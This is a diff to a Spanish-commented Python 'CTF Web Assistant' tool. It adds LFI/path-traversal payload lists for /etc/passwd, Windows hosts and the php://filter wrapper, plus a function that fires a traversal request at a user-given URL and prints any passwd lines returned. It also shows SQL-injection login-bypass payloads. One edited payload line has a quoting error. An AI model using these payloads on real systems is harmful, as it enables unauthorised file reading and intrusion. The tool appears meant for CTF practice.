@@ -1,9 +1,11 @@
 # ctfassistant/main.py
+# -*- coding: utf-8 -*-
 
 import os
 import sys
 import requests
-from bs4 import BeautifulSoup # Importado para XSS
+from bs4 import BeautifulSoup 
+import urllib.parse # Ya estaba importado implícitamente por requests.utils.quote
 
 # -----------------------------------------------
 # MÓDULOS DE PAYLOADS
@@ -13,7 +15,7 @@ def show_sqli_payloads():
     """Muestra y explica los payloads de SQLi más comunes."""
     payloads = {
         # Payloads Clásicos y para Adivinar el Número de Columnas
-        "1. Pruebas de Citas/Comentarios": ["' --", "') --", "'; --", '") --', '" --', "') or 1=1 --"],
+        "1. Pruebas de Citas/Comentarios": ["' --", "') --", "'; --", '") --', '" --", "') or 1=1 --"],
         
         # Pruebas de Bypass de Autenticación
         "2. Bypass de Login (True Always)": ["' OR 1=1 --", "' OR '1'='1 --", "' OR 'a'='a' --"],
@@ -101,6 +103,39 @@ def show_xss_payloads():
             print(f"   -> {p}")
         print("-" * 15)
 
+def show_lfi_payloads():
+    """Muestra los payloads de LFI/Path Traversal más comunes."""
+    payloads = {
+        # Payloads para Linux (el más común)
+        "1. Archivo Objetivo: /etc/passwd": [
+            "../../../../../etc/passwd", 
+            "....//....//....//....//etc/passwd", # Doble URL Encoding Bypass
+            "/etc/passwd%00" # Null Byte (antiguamente útil para terminar la cadena)
+        ],
+        
+        # Payloads para Windows (menos común en CTF web)
+        "2. Archivo Objetivo: Windows System": [
+            "..\..\..\..\windows\system32\drivers\etc\hosts",
+            "%c0%ae%c0%ae/%c0%ae%c0%ae/windows/system32/drivers/etc/hosts" # Unicode Encoding
+        ],
+
+        # Wrapper (Si solo acepta archivos locales)
+        "3. PHP Filter Wrapper": [
+            "php://filter/read=convert.base64-encode/resource=index.php" # Leer el código fuente de index.php
+        ]
+    }
+
+    print("\n[📚] PAYLOADS DE LFI / PATH TRAVERSAL [📚]")
+    print("------------------------------------------")
+    print("💡 **Objetivo:** Tratar de leer archivos del sistema (ej: /etc/passwd).\n")
+
+    for category, payload_list in payloads.items():
+        print(f"**{category}**")
+        for p in payload_list:
+            print(f"   -> {p}")
+        print("-" * 15)
+
+
 # -----------------------------------------------
 # MÓDULOS DE HERRAMIENTAS
 # -----------------------------------------------
@@ -127,6 +162,8 @@ def tool_sqli():
         payload = input("Ingresa el payload que quieres probar (ej: ' OR 1=1 --): ")
         
         if '=' in target_url:
+            # Usar urllib.parse.urljoin para manejar la ruta base y el payload, aunque
+            # para payloads inyectados al final de un parámetro, la concatenación simple es común.
             base_url, _ = target_url.rsplit('=', 1)
             full_url = f"{base_url}{payload}" # Concatenamos directamente
             
@@ -178,7 +215,7 @@ def tool_command_injection():
         
         if '=' in target_url:
             base_url, _ = target_url.rsplit('=', 1)
-            full_url = f"{base_url}{payload}"
+            full_url = f"{base_url}={urllib.parse.quote(payload)}" # Codificamos el payload para la URL
             
             print(f"\n[🚀] Probando URL: {full_url}")
             
@@ -230,7 +267,7 @@ def tool_xss():
             # Dividir la URL y usar el marcador
             base_url, _ = target_url.rsplit('=', 1)
             # Codificar el payload para que pase en la URL sin romper la petición
-            test_payload_encoded = requests.utils.quote(test_payload_raw)
+            test_payload_encoded = urllib.parse.quote(test_payload_raw)
             full_url = f"{base_url}={test_payload_encoded}"
             
             print(f"\n[🚀] Probando URL: {full_url}")
@@ -272,8 +309,62 @@ def tool_lfi():
     """Herramienta para Local File Inclusion (LFI) / Path Traversal."""
     print("\n[🛠️] Módulo: LFI / Path Traversal")
     print("---------------------------------")
-    # Lógica de LFI irá en la siguiente etapa
-    input("Presiona ENTER para volver al Menú Principal...")
+    
+    # 1. Recolección de Datos
+    target_url = input("Ingresa la URL objetivo con el parámetro (ej: http://ejemplo.com/page.php?file=index.php): ")
+    
+    if "=" not in target_url:
+        print("⚠️ Advertencia: La URL no parece tener un parámetro de entrada.")
+        input("Presiona ENTER para continuar y ver los Payloads...")
+
+    print(f"\n[🔗] URL Objetivo: {target_url}")
+    print("---------------------------------")
+    
+    show_lfi_payloads()
+    
+    # 2. Prueba de /etc/passwd
+    try_payload = input("\n¿Quieres probar el payload CLÁSICO de /etc/passwd? (S/N): ").strip().upper()
+    
+    if try_payload == 'S':
+        # Payload clásico de 6 niveles para salir de la estructura del servidor
+        test_payload_raw = "../../../../etc/passwd" 
+        
+        if '?' in target_url and '=' in target_url:
+            # Dividir la URL
+            base_url, _ = target_url.rsplit('=', 1)
+            # Codificar el payload (esto cambia los slashes)
+            test_payload_encoded = urllib.parse.quote(test_payload_raw)
+            full_url = f"{base_url}={test_payload_encoded}"
+            
+            print(f"\n[🚀] Probando URL: {full_url}")
+            
+            try:
+                response = requests.get(full_url, timeout=10)
+                
+                print(f"[*] Código de Estado HTTP: {response.status_code}")
+                
+                # 3. Análisis de la Respuesta
+                # Buscamos la estructura del archivo /etc/passwd
+                if "root:" in response.text or "daemon:" in response.text:
+                    print("\n[✅] ¡VULNERABILIDAD CONFIRMADA! La página muestra el contenido de /etc/passwd.")
+                    print("   ¡Ahora puedes leer otros archivos importantes del sistema!")
+                    
+                    print("\n[🔍] Contenido de /etc/passwd (Primeras 5 líneas):")
+                    passwd_lines = [line for line in response.text.splitlines() if ':' in line and len(line) > 10]
+                    for line in passwd_lines[:5]:
+                         print(line.strip()[:100])
+                else:
+                    print("\n[❌] FALLO. El contenido de /etc/passwd NO fue encontrado.")
+                    print("   Intenta codificar el payload de forma diferente o cambiar el archivo objetivo.")
+                    
+            except requests.exceptions.RequestException as e:
+                print(f"❌ Error al conectar con la URL: {e}")
+                
+        else:
+            print("❌ La URL debe contener un parámetro (ej: ?file=) para la prueba automática.")
+
+    print("\n[✅] Análisis de LFI completado. ¡A buscar archivos!")
+    input("\nPresiona ENTER para volver al Menú Principal...")
 
 
 # -----------------------------------------------
@@ -283,7 +374,7 @@ def tool_lfi():
 def show_injection_menu():
     """Muestra el submenú para las herramientas de Inyección."""
     while True:
-        os.system('clear') # Limpia la pantalla, útil en Kali
+        # os.system('clear') # Limpia la pantalla, útil en Kali <--- COMENTADO PARA COMPATIBILIDAD
         print("╔══════════════════════════════════════════╗")
         print("║        [1] MENÚ DE INYECCIÓN             ║")
         print("╠══════════════════════════════════════════╣")
@@ -307,7 +398,7 @@ def main_menu():
     """Muestra el menú principal de la herramienta."""
     while True:
         try:
-            os.system('clear') # Limpia la pantalla
+            # os.system('clear') # Limpia la pantalla <--- COMENTADO PARA COMPATIBILIDAD
             print("╔══════════════════════════════════════════╗")
             print("║     [🔥] CTF WEB ASSISTANT [🔥]          ║")
             print("╠══════════════════════════════════════════╣")
@@ -324,7 +415,7 @@ def main_menu():
             elif choice == '2':
                 tool_xss()
             elif choice == '3':
-                tool_lfi()
+                tool_lfi() # Llama a la función tool_lfi
             elif choice == '4':
                 print("\n¡Éxito en tus retos! ¡Hasta pronto! 👋")
                 sys.exit(0)
@@ -337,7 +428,8 @@ def main_menu():
             sys.exit(0)
             
         except Exception as e:
-            print(f"\nOcurrió un error inesperado: {e}")
+            # Quitamos el print de error para evitar el error de codificación si falla
+            print(f"\nOcurrió un error inesperado (Detalles: {e}).") 
             input("Presiona ENTER para volver al menú...")
 
 def main():
